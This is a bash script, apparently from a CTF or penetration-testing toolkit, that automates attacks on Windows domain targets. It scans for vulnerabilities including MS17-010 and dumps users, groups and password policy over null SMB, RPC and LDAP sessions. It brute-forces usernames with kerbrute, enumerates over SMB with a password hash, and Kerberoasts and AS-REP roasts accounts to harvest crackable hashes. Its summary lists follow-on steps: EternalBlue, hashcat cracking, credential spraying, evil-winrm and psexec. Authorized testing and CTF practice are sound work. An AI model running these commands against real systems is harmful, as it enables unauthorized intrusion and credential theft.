#!/usr/bin/env bash
# windows-enum.sh — Automated Windows initial enumeration from Kali
#
# Runs SMB, LDAP, RPC, Kerberos, WinRM enumeration against a Windows target.
# Scope-agnostic: used for both CTF boxes and authorized pentest targets.
#
# Usage:
#   windows-enum.sh --target 10.10.10.10
#   windows-enum.sh --target 10.10.10.10 --domain corp.local
#   windows-enum.sh --target 10.10.10.10 --creds administrator:Password1
#   windows-enum.sh --target 10.10.10.10 --hash :NTLM_HASH --user administrator
#   windows-enum.sh --target 10.10.10.10 --domain corp.local --creds user:pass --full

set -euo pipefail

CTF_ROOT="${CTF_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
ARTIFACTS="$CTF_ROOT/artifacts/windows"

TARGET=""
DOMAIN=""
CREDS=""
USER=""
PASS=""
HASH=""
FULL=false

while [[ $# -gt 0 ]]; do
  case "$1" in
    --target|-t)  TARGET="$2";  shift 2 ;;
    --domain|-d)  DOMAIN="$2";  shift 2 ;;
    --creds|-c)   CREDS="$2";   shift 2 ;;
    --user|-u)    USER="$2";    shift 2 ;;
    --hash)       HASH="$2";    shift 2 ;;
    --full)       FULL=true;    shift ;;
    -h|--help) grep '^#' "$0" | head -15 | sed 's/^# \?//'; exit 0 ;;
    *) echo "[!] Unknown flag: $1"; exit 1 ;;
  esac
done

[[ -z "$TARGET" ]] && { echo "[!] --target required"; exit 1; }

# Parse creds if provided as user:pass
if [[ -n "$CREDS" ]]; then
  USER="${CREDS%%:*}"
  PASS="${CREDS#*:}"
fi

# Setup output directory
OUT="$ARTIFACTS/$TARGET/enum"
mkdir -p "$OUT"
LOG="$OUT/enum.log"
SUMMARY="$OUT/enum_summary.md"

ts()   { date +%H:%M:%S; }
log()  { echo "[$(ts)] $*" | tee -a "$LOG"; }
ok()   { echo "[$(ts)] [+] $*" | tee -a "$LOG"; }
warn() { echo "[$(ts)] [!] $*" | tee -a "$LOG"; }
hr()   { echo "────────────────────────────────────────" | tee -a "$LOG"; }

log "Target: $TARGET"
[[ -n "$DOMAIN" ]] && log "Domain: $DOMAIN"
[[ -n "$USER"   ]] && log "User:   $USER"
hr

# ── Helper: check if port is open ────────────────────────────────────────────
port_open() {
  nc -z -w3 "$TARGET" "$1" 2>/dev/null
}

# ── Phase 1: Port scan ────────────────────────────────────────────────────────
hr
log "Phase 1: Port scan"

# Quick top-ports first
nmap -sV --top-ports 1000 -T4 --open \
  -oN "$OUT/nmap_top1k.nmap" "$TARGET" 2>/dev/null | \
  grep -E "open|filtered" | tee -a "$LOG" || true

# Windows-specific scripts
log "Running Windows NSE scripts..."
nmap -sV -sC -p 135,139,445,389,636,3389,5985,5986,88,53,1433 \
  --script "smb-vuln*,smb-security-mode,smb-os-discovery,ldap-rootdse,ms-sql-info,rdp-enum-encryption" \
  -oN "$OUT/nmap_scripts.nmap" "$TARGET" 2>/dev/null | \
  grep -E "open|VULNERABLE|Script" | tee -a "$LOG" || true

# Check MS17-010 specifically
if port_open 445; then
  log "Checking MS17-010..."
  nmap --script smb-vuln-ms17-010 -p 445 "$TARGET" -oN "$OUT/nmap_ms17010.nmap" 2>/dev/null | \
    grep -E "VULNERABLE|safe|State" | tee -a "$LOG" || true
fi

ok "Port scan complete → $OUT/nmap_*.nmap"

# ── Phase 2: SMB enumeration ──────────────────────────────────────────────────
hr
if port_open 445; then
  log "Phase 2: SMB enumeration"

  # Null session smbmap
  log "smbmap null session..."
  smbmap -H "$TARGET" 2>/dev/null | tee "$OUT/smbmap_null.txt" | tee -a "$LOG" || true

  # Null session smbclient
  log "smbclient share list..."
  smbclient -L "//$TARGET" -N 2>/dev/null | tee "$OUT/smbclient_shares.txt" | tee -a "$LOG" || true

  # enum4linux-ng (most comprehensive)
  log "enum4linux-ng (this may take a minute)..."
  if command -v enum4linux-ng &>/dev/null; then
    enum4linux-ng -A "$TARGET" 2>/dev/null | tee "$OUT/enum4linux.txt" | grep -E "users|groups|shares|password|domain|status" | tee -a "$LOG" || true
  elif command -v enum4linux &>/dev/null; then
    enum4linux -a "$TARGET" 2>/dev/null | tee "$OUT/enum4linux.txt" | grep -E "user|group|share|domain" | tee -a "$LOG" || true
  else
    warn "enum4linux not found — skipping"
  fi

  # CrackMapExec
  if command -v crackmapexec &>/dev/null; then
    log "CrackMapExec SMB check..."
    crackmapexec smb "$TARGET" 2>/dev/null | tee "$OUT/cme_smb.txt" | tee -a "$LOG" || true

    if [[ -n "$USER" && -n "$PASS" ]]; then
      log "Authenticated SMB enum (user: $USER)..."
      crackmapexec smb "$TARGET" -u "$USER" -p "$PASS" --users --groups --shares --pass-pol \
        2>/dev/null | tee "$OUT/cme_auth.txt" | tee -a "$LOG" || true
    elif [[ -n "$USER" && -n "$HASH" ]]; then
      log "PtH SMB enum (user: $USER)..."
      crackmapexec smb "$TARGET" -u "$USER" -H "$HASH" --users --groups --shares \
        2>/dev/null | tee "$OUT/cme_pth.txt" | tee -a "$LOG" || true
    fi
  elif command -v netexec &>/dev/null; then
    log "netexec SMB check..."
    netexec smb "$TARGET" 2>/dev/null | tee "$OUT/nxc_smb.txt" | tee -a "$LOG" || true
  fi

  ok "SMB enumeration complete → $OUT/smb*"
else
  warn "Port 445 closed — skipping SMB"
fi

# ── Phase 3: RPC enumeration ──────────────────────────────────────────────────
hr
if port_open 135 || port_open 445; then
  log "Phase 3: RPC enumeration"

  rpcclient -U "" "$TARGET" -N 2>/dev/null <<'EOF' | tee "$OUT/rpcclient_null.txt" | tee -a "$LOG" || true
enumdomusers
enumdomgroups
querydominfo
lsaquery
getdompwinfo
EOF

  if [[ -n "$USER" && -n "$PASS" ]]; then
    log "Authenticated RPC..."
    rpcclient -U "$USER%$PASS" "$TARGET" 2>/dev/null <<'EOF' | tee "$OUT/rpcclient_auth.txt" | tee -a "$LOG" || true
enumdomusers
enumdomgroups
enumdomains
querydominfo
getusrdompwinfo 0x1f4
EOF
  fi

  ok "RPC enumeration complete"
fi

# ── Phase 4: LDAP enumeration ─────────────────────────────────────────────────
hr
if port_open 389 || port_open 636; then
  log "Phase 4: LDAP enumeration"

  # Discover base DN
  BASE=$(ldapsearch -x -H "ldap://$TARGET" -s base namingcontexts 2>/dev/null | \
    grep namingcontexts | head -1 | awk '{print $2}' || echo "")

  if [[ -n "$BASE" ]]; then
    ok "Base DN: $BASE"
    echo "Base DN: $BASE" > "$OUT/ldap_basedn.txt"

    # Null bind full dump
    log "LDAP null bind dump..."
    ldapsearch -x -H "ldap://$TARGET" -b "$BASE" 2>/dev/null | \
      tee "$OUT/ldap_null_dump.txt" | wc -l | xargs -I{} log "  {} lines from LDAP"

    if [[ -n "$USER" && -n "$PASS" && -n "$DOMAIN" ]]; then
      log "Authenticated LDAP — users with SPNs (Kerberoast candidates)..."
      ldapsearch -x -H "ldap://$TARGET" -b "$BASE" \
        -D "$USER@$DOMAIN" -w "$PASS" \
        "(&(objectClass=user)(servicePrincipalName=*))" \
        sAMAccountName servicePrincipalName 2>/dev/null | \
        tee "$OUT/ldap_spns.txt" | grep "sAMAccountName\|servicePrincipalName" | tee -a "$LOG" || true

      log "Authenticated LDAP — AS-REP roastable (no pre-auth)..."
      ldapsearch -x -H "ldap://$TARGET" -b "$BASE" \
        -D "$USER@$DOMAIN" -w "$PASS" \
        "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
        sAMAccountName 2>/dev/null | \
        tee "$OUT/ldap_asrep.txt" | grep "sAMAccountName" | tee -a "$LOG" || true
    fi
  else
    warn "LDAP null bind returned no base DN — may require auth"
  fi

  ok "LDAP enumeration complete"
else
  warn "Port 389/636 closed — skipping LDAP"
fi

# ── Phase 5: Kerberos user enum ───────────────────────────────────────────────
hr
if port_open 88 && [[ -n "$DOMAIN" ]]; then
  log "Phase 5: Kerberos user enumeration (kerbrute)"

  if command -v kerbrute &>/dev/null; then
    kerbrute userenum \
      --dc "$TARGET" \
      -d "$DOMAIN" \
      /usr/share/seclists/Usernames/xato-net-10-million-usernames-shorter.txt \
      -o "$OUT/kerbrute_users.txt" \
      --downgrade 2>/dev/null | grep -E "VALID|roastable" | tee -a "$LOG" || true
    ok "Kerbrute complete → $OUT/kerbrute_users.txt"
  else
    warn "kerbrute not found — install: go install github.com/ropnop/kerbrute@latest"
  fi
elif port_open 88 && [[ -z "$DOMAIN" ]]; then
  warn "Port 88 open but --domain not provided — skipping kerbrute"
fi

# ── Phase 6: WinRM check ─────────────────────────────────────────────────────
hr
if port_open 5985 || port_open 5986; then
  log "Phase 6: WinRM check"

  if command -v crackmapexec &>/dev/null; then
    crackmapexec winrm "$TARGET" 2>/dev/null | tee "$OUT/cme_winrm.txt" | tee -a "$LOG" || true

    if [[ -n "$USER" && -n "$PASS" ]]; then
      crackmapexec winrm "$TARGET" -u "$USER" -p "$PASS" 2>/dev/null | \
        tee -a "$OUT/cme_winrm.txt" | tee -a "$LOG" || true
    fi
  fi
  ok "WinRM check complete"
fi

# ── Phase 7: Full AS-REP + Kerberoast attempts ───────────────────────────────
if $FULL && [[ -n "$DOMAIN" ]]; then
  hr
  log "Phase 7: Kerberoast + AS-REP roast"

  if [[ -n "$USER" && -n "$PASS" ]]; then
    log "Kerberoasting..."
    impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$TARGET" \
      -request -outputfile "$OUT/kerberoast.hashes" 2>/dev/null | tee -a "$LOG" || true
    [[ -f "$OUT/kerberoast.hashes" ]] && ok "Kerberoast hashes: $OUT/kerberoast.hashes"
  fi

  log "AS-REP roasting..."
  if [[ -f "$OUT/kerbrute_users.txt" ]]; then
    grep "VALID" "$OUT/kerbrute_users.txt" 2>/dev/null | awk '{print $NF}' | \
      sed 's/@.*//' > "$OUT/valid_users.txt" || true
    impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET" -no-pass \
      -usersfile "$OUT/valid_users.txt" -format hashcat \
      -outputfile "$OUT/asrep.hashes" 2>/dev/null | tee -a "$LOG" || true
    [[ -f "$OUT/asrep.hashes" ]] && ok "AS-REP hashes: $OUT/asrep.hashes"
  fi
fi

# ── Summary ───────────────────────────────────────────────────────────────────
hr
log "Generating summary..."

cat > "$SUMMARY" <<SUMMARY
# Windows Enum Summary: $TARGET
**Date**: $(date -u +%Y-%m-%dT%H:%M:%SZ)
**Domain**: ${DOMAIN:-unknown}
**Auth**: ${USER:-none}

## Open Ports
\`\`\`
$(grep "open" "$OUT/nmap_top1k.nmap" 2>/dev/null | head -20 || echo "See nmap_top1k.nmap")
\`\`\`

## SMB Info
\`\`\`
$(head -10 "$OUT/cme_smb.txt" 2>/dev/null || head -10 "$OUT/smbmap_null.txt" 2>/dev/null || echo "No SMB data")
\`\`\`

## Domain Users Found
\`\`\`
$(grep -h "sAMAccountName" "$OUT/ldap_null_dump.txt" "$OUT/rpcclient_null.txt" 2>/dev/null | head -20 || echo "None — try with creds or kerbrute")
\`\`\`

## Kerberoast Candidates (SPNs)
\`\`\`
$(grep "sAMAccountName\|servicePrincipalName" "$OUT/ldap_spns.txt" 2>/dev/null | head -10 || echo "None / not checked")
\`\`\`

## AS-REP Roastable Users
\`\`\`
$(grep "sAMAccountName" "$OUT/ldap_asrep.txt" 2>/dev/null | head -10 || echo "None / not checked")
\`\`\`

## Vulnerabilities
\`\`\`
$(grep -h "VULNERABLE\|vulnerable" "$OUT/nmap_ms17010.nmap" "$OUT/nmap_scripts.nmap" 2>/dev/null | head -10 || echo "None detected by NSE scripts")
\`\`\`

## Next Steps
- [ ] Run exploit-pipeline.sh on any identified service versions
- [ ] If MS17-010 VULNERABLE: use eternalblue exploit
- [ ] If SPNs found: crack kerberoast.hashes with hashcat -m 13100
- [ ] If WinRM open + creds: evil-winrm -i $TARGET -u USER -p PASS
- [ ] If no creds: credential spray with identified usernames

## Artifacts
$(ls "$OUT"/*.txt "$OUT"/*.nmap "$OUT"/*.hashes 2>/dev/null | sed 's|.*|  - &|')
SUMMARY

ok "Summary: $SUMMARY"
echo ""
echo "=== NEXT ACTIONS ==="
echo "  evil-winrm -i $TARGET -u USER -p PASS"
echo "  impacket-psexec DOMAIN/USER:PASS@$TARGET"
echo "  bash $CTF_ROOT/scripts/windows-privesc.sh --target $TARGET --user USER --pass PASS"
echo "  bash $CTF_ROOT/scripts/exploit-pipeline.sh -s 'SERVICE VERSION' -t $TARGET"
echo ""
ok "Windows enumeration complete. Artifacts: $OUT"
